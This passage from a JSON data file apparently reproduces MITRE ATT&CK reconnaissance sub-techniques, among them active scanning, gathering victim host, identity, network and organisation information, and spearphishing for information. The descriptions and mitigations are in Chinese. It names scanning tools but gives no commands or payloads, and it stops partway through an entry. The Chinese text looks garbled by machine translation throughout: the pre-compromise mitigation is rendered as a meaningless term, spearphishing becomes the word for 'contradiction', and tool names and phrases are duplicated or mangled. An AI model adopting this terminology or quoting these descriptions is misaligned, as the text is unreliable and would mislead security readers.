[
  {
    "id": "T1595.001",
    "name": "Scanning IP Blocks",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Active Scanning",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会扫描受害者IP块以收集可以在目标过程中使用的信息。公共IP地址可以通过块或一系列顺序地址分配给组织。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以扫描IP块以收集受害者网络信息，例如，在使用哪些IP地址以及有关分配这些地址的主机的更详细信息。扫描可能从简单ping（ICMP请求和响应）到更多细微的扫描，这些扫描可能会通过服务器横幅或其他网络工件揭示主机软件/版本。这些扫描中的信息可能会揭示其他形式的侦察的机会（例如：搜索打开的网站/域或搜索打开的技术数据库），建立运营资源（例如：开发功能或获得功能）和/或初始访问（例如：外部远程远程访问服务）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1595.002",
    "name": "Vulnerability Scanning",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Active Scanning",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会扫描受害者是否在靶向过程中可以使用的漏洞。漏洞扫描通常检查目标主机/应用程序的配置（例如：软件和版本）是否可能与对手可能寻求使用的特定利用的目标保持一致。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这些扫描还可能包括更广泛的尝试来收集受害者寄主信息，这些信息可用于识别更普遍的可剥削脆弱性。漏洞扫描通常会通过服务器标语，收听端口或其他网络工件收集运行软件和版本号。来自这些扫描的信息可能会揭示其他形式的侦察机会（例如：搜索开放网站/域或搜索开放技术数据库），建立运营资源（例如：开发功能或获得功能）和/或初始访问（例如：开发公众开发：-Facing应用程序）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1595.003",
    "name": "Wordlist Scanning",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Active Scanning",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用野蛮和爬行技术进行迭代探测基础架构。尽管该技术采用类似的方法来蛮力，但其目标是识别内容和基础架构，而不是发现有效的凭据。这些扫描中使用的单词列表可能包含通用的，常用的名称和文件扩展名或特定于特定软件的术语。对手还可以使用从其他侦察技术收集的数据（例如：收集受害者组织信息或搜索受害者拥有的网站）创建自定义的，特定目标的文字列表。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，对手可以使用Web内容发现工具，例如Dirb，Dirbuster和Gobuster，Gobuster和Generic或Custom WordLists来列举网站的页面和目录。这可以帮助他们发现可能成为进一步操作的目标的旧，脆弱的页面或隐藏的管理门户（例如：开发面向公共的应用程序或蛮力）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "由于云存储解决方案通常使用全球唯一的名称，因此对手也可以使用特定于目标的文字列表和工具，例如S3recon和GCPBucketBucketBrute来枚举云基础架构上的公共和私人存储桶。一旦发现了存储对象，对手可能会利用云存储的数据来访问有价值的信息，这些信息可以被淘汰或用于升级特权并横向移动。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "删除或禁用对不明确需要外部可用的任何系统，资源和基础架构的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1592.001",
    "name": "Hardware",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Host Information",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集有关受害者的主机硬件的信息，这些硬件可以在定位期间使用。有关硬件基础架构的信息可能包括各种细节，例如特定主机上的类型和版本，以及可能表明防御性保护措施的其他组件（例如：卡/生物识别读取器，专用加密硬件等）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过主动扫描（例如：主机名，服务器标语，用户代理字符串）或网络钓鱼的直接收集操作以获取信息。对手也可能会妥协站点，然后包括旨在从访问者那里收集主机信息的恶意内容。有关硬件基础架构的信息也可以通过在线或其他可访问的数据集（例如：职位发布，网络地图，评估报告，简历或购买发票）接触到对手。收集此信息可能会揭示其他形式的侦察的机会（例如：搜索开放网站/域或搜索开放技术数据库），建立运营资源（例如：开发功能或获得功能）和/或初始访问（例如：折衷硬件供应链或硬件添加）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1592.002",
    "name": "Software",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Host Information",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集有关受害者的主机软件的信息，这些软件可以在定位期间使用。有关已安装软件的信息可能包括各种详细信息，例如特定主机上的类型和版本，以及可能表明防御性保护措施的其他组件（例如：Antivirus，SIEM等）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过主动扫描（例如：侦听端口，服务器标语，用户代理字符串）或网络钓鱼的直接收集操作。对手也可能会妥协站点，然后包括旨在从访问者那里收集主机信息的恶意内容。有关已安装软件的信息也可以通过在线或其他无障碍数据集（例如：职位发布，网络地图，评估报告，简历或购买发票）暴露于对手身上。收集此信息可能会揭示其他形式的侦察的机会（例如：搜索开放网站/域或搜索开放技术数据库），建立运营资源（例如：开发能力或获得功能）和/或用于初始访问（例如：供应链：供应链：妥协或外部远程服务）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1592.003",
    "name": "Firmware",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Host Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集有关受害者的宿主固件的信息，这些固件可在定位期间使用。有关主机固件的信息可能包括各种详细信息，例如特定主机上的类型和版本，这些详细信息可用于推断有关环境中主机的更多信息（例如：配置，目的，年龄/补丁级别等）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过网络钓鱼直接启发以获取信息。有关主机固件的信息只能通过在线或其他可访问的数据集（例如：职位发布，网络地图，评估报告，简历或购买发票）暴露于对手身上。收集此信息可能会揭示其他形式的侦察的机会（例如：搜索开放网站/域或搜索开放技术数据库），建立运营资源（例如：开发功能或获得功能）和/或初始访问（例如：供应链妥协：或利用面向公共的申请）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1592.004",
    "name": "Client Configurations",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Host Information",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集有关受害者客户配置的信息，这些信息可以在定位期间使用。有关客户端配置的信息可能包括各种详细信息和设置，包括操作系统/版本，虚拟化，体系结构（例如：32或64位），语言和/或时区。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过主动扫描（例如：侦听端口，服务器标语，用户代理字符串）或网络钓鱼的直接收集操作。对手也可能会妥协站点，然后包括旨在从访问者那里收集主机信息的恶意内容。有关客户端配置的信息也可以通过在线或其他可访问的数据集（例如：职位发布，网络地图，评估报告，简历或购买发票）接触到对手。收集此信息可能会揭示其他形式的侦察的机会（例如：搜索开放网站/域或搜索开放技术数据库），建立运营资源（例如：开发功能或获得功能）和/或初始访问（例如：供应链妥协：或外部远程服务）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1589.001",
    "name": "Credentials",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Identity Information",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集可以在定位期间使用的凭据。对手收集的帐户凭据可能是与目标受害者组织直接相关的帐户，或试图利用用户在个人和业务帐户上使用相同密码的趋势。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式从潜在受害者那里收集凭证，例如通过网络钓鱼直接启发信息。对手也可能会妥协网站，然后添加旨在从访问者那里收集网站身份验证饼干的恶意内容。凭据信息也可以通过在线或其他无障碍数据集（例如：搜索引擎，漏洞，代码存储库等）来暴露于对手。对手也可以从黑网或其他黑人市场购买凭据。最后，使用基于带外通信的多因素身份验证（MFA）正在使用，对手可能会损害服务提供商以访问MFA代码和一次性密码（OTP）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "收集此信息可能会揭示其他形式的侦察机会（例如：搜索开放网站/域或网络钓鱼以获取信息），建立运营资源（例如：妥协帐户）和/或初始访问（例如：外部远程服务或有效的帐户）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1589.002",
    "name": "Email Addresses",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Identity Information",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集可以在定位期间使用的电子邮件地址。即使存在内部实例，组织也可能拥有面向公共的电子邮件基础架构和员工的地址。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能很容易收集电子邮件地址，因为它们可能很容易通过在线或其他可访问的数据集（例如：社交媒体或搜索受害者拥有的网站）暴露。电子邮件地址也可以通过更有效的手段（即主动扫描）来列举，例如探索和分析身份验证服务的响应，这些验证服务可能会揭示系统中有效的用户名。例如，对手可以通过查询各种公开可用的API端点（例如AutodeDiscover和GetCredentialType）来列举Office 365环境中的电子邮件地址。"
        }
      ],
      [
        {
          "type": "text",
          "content": "收集此信息可能会揭示其他形式的侦察的机会（例如：搜索开放网站/域或网络钓鱼以获取信息），建立运营资源（例如：电子邮件帐户）和/或初始访问服务）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1589.003",
    "name": "Employee Names",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Identity Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集可以在目标期间使用的员工名称。员工姓名可用于得出电子邮件地址，并帮助指导其他侦察工作和/或更令人难以置信的诱饵。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能很容易收集员工名称，因为它们可以随时通过在线或其他无障碍数据集（例如：社交媒体或搜索受害者拥有的网站）暴露。收集此信息可能会揭示其他形式的侦察机会（例如：搜索开放网站/域或网络钓鱼以获取信息），建立运营资源（例如：妥协帐户）和/或初始访问（例如：网络钓鱼或有效帐户）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1590.001",
    "name": "Domain Properties",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Network Information",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集有关受害者网络领域的信息，这些信息可以在定位期间使用。有关域及其属性的信息可能包括各种详细信息，包括受害人拥有的域以及管理数据（例如：名称，注册商等）以及更直接可行的信息，例如联系人（电子邮件地址和电话）数字），业务地址和名称服务器。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过主动扫描或网络钓鱼进行直接收集操作以获取信息。有关受害域及其属性的信息也可以通过在线或其他可访问的数据集（例如：WHOIS）接触到对手。在使用第三方云提供商的地方，此信息也可以通过公开可用的API端点（例如GetuseRlelealm和Office 365环境中的自动发现）暴露。收集此信息可能会揭示其他形式的侦察机会（例如：搜索开放技术数据库，搜索打开的网站/域或网络钓鱼以获取信息），建立运营资源（例如：获得基础架构或妥协基础架构）和/或初始访问（例如：网络钓鱼）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1590.002",
    "name": "DNS",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Network Information",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集有关受害者DNS的信息。DNS信息可能包括各种详细信息，包括注册的名称服务器以及概述针对目标子域，邮件服务器和其他主机的记录。DNS，MX，TXT和SPF Records也可能会揭示使用第三方云和SaaS提供商的使用，例如Office 365，G Suite，Salesforce或Zendesk。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如查询或以其他方式通过DNS/无源DNS收集详细信息。DNS信息也可以通过在线或其他可访问的数据集（例如：搜索打开的技术数据库）接触到对手。收集此信息可能会揭示其他形式的侦察的机会（例如：搜索开放技术数据库，搜索打开的网站/域或主动扫描），建立运营资源（例如：获取基础架构或妥协基础架构）和/或初始访问（例如：外部远程服务）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "预防控制措施无法轻易缓解这种情况，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1590.003",
    "name": "Network Trust Dependencies",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Network Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集有关受害者网络信任依赖性的信息，这些信息可以在定位期间使用。有关网络信托的信息可能包括各种详细信息，包括第二或第三方组织/域（例如：托管服务提供商，承包商等）已连接（并有可能提高）网络访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过网络钓鱼直接启发以获取信息。有关网络信任的信息也可以通过在线或其他无障碍数据集（例如：搜索打开的技术数据库）接触到对手。收集此信息可能会揭示其他形式的侦察的机会（例如：主动扫描或搜索开放网站/域），建立运营资源（例如：收购基础架构或妥协基础架构）和/或初始访问（例如：可信关系）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1590.004",
    "name": "Network Topology",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Network Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集有关受害者网络拓扑的信息，这些信息可以在定位期间使用。有关网络拓扑的信息可能包括各种详细信息，包括外部面向和内部网络环境的物理和/或逻辑安排。此信息还可能包括有关网络设备（网关，路由器等）和其他基础架构的详细信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过主动扫描或网络钓鱼进行直接收集操作以获取信息。有关网络拓扑的信息也可以通过在线或其他无障碍数据集（例如：搜索受害者拥有的网站）接触到对手。收集此信息可能会揭示其他形式的侦察的机会（例如：搜索开放技术数据库或搜索开放网站/域），建立运营资源（例如：获得基础架构或妥协基础架构）和/或初始访问（例如：外部远程服务：）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1590.005",
    "name": "IP Addresses",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Network Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集受害者的IP地址，这些地址可以在定位期间使用。公共IP地址可以通过块或一系列顺序地址分配给组织。有关分配的IP地址的信息可能包括各种详细信息，例如正在使用的IP地址。IP地址还可以使对手能够获取有关受害者的其他详细信息，例如组织规模，物理位置，Internet服务提供商以及或或如何/如何/如何/如何托管其面向公开的基础架构。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过主动扫描或网络钓鱼进行直接收集操作以获取信息。有关分配的IP地址的信息也可以通过在线或其他可访问的数据集（例如：搜索打开的技术数据库）暴露于对手。收集此信息可能会揭示其他形式的侦察的机会（例如：主动扫描或搜索开放网站/域），建立运营资源（例如：获得基础架构或妥协基础架构）和/或初始访问（例如：外部远程服务）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1590.006",
    "name": "Network Security Appliances",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Network Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集有关受害者网络安全设备的信息，这些设备可以在定位期间使用。有关网络安全设备的信息可能包括各种详细信息，例如部署的防火墙，内容过滤器和代理/堡垒主机的存在和细节。对手还可以针对有关基于受害者网络的入侵检测系统（NID）或与防御性网络安全操作有关的其他设备的信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过主动扫描或网络钓鱼进行直接收集操作以获取信息。有关网络安全设备的信息也可以通过在线或其他可访问的数据集（例如：搜索受害者拥有的网站）暴露于对手。收集此信息可能会揭示其他形式的侦察机会（例如：搜索开放技术数据库或搜索开放网站/域），建立运营资源（例如：开发功能或获得功能）和/或初始访问（例如：外部远程服务：）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1591.001",
    "name": "Determine Physical Locations",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Org Information",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集可以在目标期间使用的受害者的身体位置。有关目标组织的物理位置的信息可能包括各种细节，包括关键资源和基础设施所在的位置。物理位置还可以表明受害人内部运营的法律管辖权和/或当局。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过网络钓鱼直接启发以获取信息。目标组织的物理位置也可以通过在线或其他无障碍数据集（例如：搜索受害者拥有的网站或社交媒体）接触对手。收集此信息可能会揭示其他形式的侦察的机会（例如：信息或搜索开放网站/域），建立运营资源（例如：开发功能或获得功能）和/或初始访问（例如：网络钓鱼或硬件添加））。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1591.002",
    "name": "Business Relationships",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Org Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集有关受害者在定位期间可以使用的信息的信息。有关组织的业务关系的信息可能包括各种详细信息，包括第二或第三方组织/域（例如：托管服务提供商，承包商等）已连接（并有可能提升）网络访问。此信息还可能揭示了受害者的硬件和软件资源的供应链和装运路径。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过网络钓鱼直接启发以获取信息。有关业务关系的信息也可以通过在线或其他无障碍数据集（例如：社交媒体或搜索受害者拥有的网站）接触到对手。收集此信息可能会揭示其他形式的侦察机会（例如：信息或搜索开放网站/域），建立运营资源（例如：建立帐户或折衷帐户）和/或初始访问（例如：供应链折衷，开车妥协或可信赖的关系）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1591.003",
    "name": "Identify Business Tempo",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Org Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集有关受害者的业务节奏的信息，这些信息可以在定位期间使用。有关组织的业务节奏的信息可能包括各种详细信息，包括一周中的运营时间/天。这些信息还可能揭示了受害者硬件和软件资源的购买以及运输的时间/日期。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过网络钓鱼直接启发以获取信息。有关业务节奏的信息也可以通过在线或其他无障碍数据集（例如：社交媒体或搜索受害者拥有的网站）接触到对手。收集此信息可能会揭示其他形式的侦察的机会（例如：信息或搜索开放网站/域），建立运营资源（例如：建立帐户或折衷帐户）和/或初始访问（例如：供应链折衷或供应链妥协或可信赖的关系）"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1591.004",
    "name": "Identify Roles",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Gather Victim Org Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会收集有关受害者组织中可以使用的身份和角色的信息。有关业务角色的信息可能会揭示各种目标细节，包括关键人员的可识别信息以及他们可以访问的数据/资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会以各种方式收集此信息，例如通过网络钓鱼直接启发以获取信息。有关业务角色的信息也可以通过在线或其他无障碍数据集（例如：社交媒体或搜索受害者拥有的网站）接触到对手。收集此信息可能会揭示其他形式的侦察机会（例如：信息或搜索开放网站/域），建立运营资源（例如：建立帐户或折衷帐户）和/或初始访问（例如：网络钓鱼）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。努力应着重于最大程度地降低外部各方可用数据的数量和灵敏度。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1598.001",
    "name": "Spearphishing Service",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Phishing for Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会通过第三方服务发送带状网络播出消息，以引起敏感信息，这些信息可在定位过程中使用。spearphening for信息是试图将目标欺骗到泄露信息，经常凭据或其他可操作的信息。信息捕捞经常涉及社会工程技术，例如摆姿势作为来源，有理由收集信息（例如：建立帐户或妥协帐户）和/或发送多个看似紧急的消息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "各种形式的矛盾形式都是针对特定个人，公司或行业的以电子方式交付的社会工程。在这种情况下，对手通过各种社交媒体服务，个人网络邮件和其他非企业受控服务发送消息。与企业相比，这些服务更有可能具有较小的标准安全政策。与大多数的矛盾钓鱼一样，目标是与目标产生融洽的关系，或以某种方式获得目标的兴趣。对手可能会创建虚假的社交媒体帐户和消息员工，以获取潜在的工作机会。这样做允许询问有关其环境的服务，政策和信息的合理原因。对手还可以使用以前的侦察工作（例如：社交媒体或搜索受害者拥有的网站）中的信息来制作有说服力和可信的诱饵。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "可以培训用户以识别社会工程技术和矛盾的尝试。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1598.002",
    "name": "Spearphishing Attachment",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Phishing for Information",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会发送带有恶意依恋的带状网络，以引起敏感信息，这些信息可以在定位过程中使用。spearphening for信息是试图将目标欺骗到泄露信息，经常凭据或其他可操作的信息。信息捕捞经常涉及社会工程技术，例如摆姿势作为来源，有理由收集信息（例如：建立帐户或妥协帐户）和/或发送多个看似紧急的消息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "各种形式的矛盾形式都是针对特定个人，公司或行业的以电子方式交付的社会工程。在这种情况下，对手将文件附加到矛盾的电子邮件中，通常依靠收件人填充信息，然后返回文件。Spearphishing电子邮件的文字通常会试图提供有关文件应填写的合理原因，例如从商业伙伴那里寻求信息的请求。对手还可以使用以前的侦察工作中的信息（例如：搜索开放网站/域名或搜索受害者拥有的网站）来制作有说服力和可信的诱饵。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "使用反企业和电子邮件身份验证机制根据发件人域（使用SPF）的有效性检查和消息完整性（使用DKIM）过滤消息。在组织中启用这些机制（通过诸如DMARC之类的策略）可以使接收者（Intra-Org和Cross域）执行类似的消息过滤和验证。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "可以培训用户以识别社会工程技术和矛盾的尝试。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1598.003",
    "name": "Spearphishing Link",
    "tactics": [
      {
        "id": "TA0043",
        "name": "Reconnaissance"
      }
    ],
    "technique": "Phishing for Information",
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会向带有恶意链接的带状网示示意消息，以引发敏感信息，这些信息可以在定位过程中使用。spearphening for信息是试图将目标欺骗到泄露信息，经常凭据或其他可操作的信息。信息捕捞经常涉及社会工程技术，例如摆姿势作为来源，有理由收集信息（例如：建立帐户或妥协帐户）和/或发送多个看似紧急的消息。"
        }
      ],
      [
        {
          "type": "text",
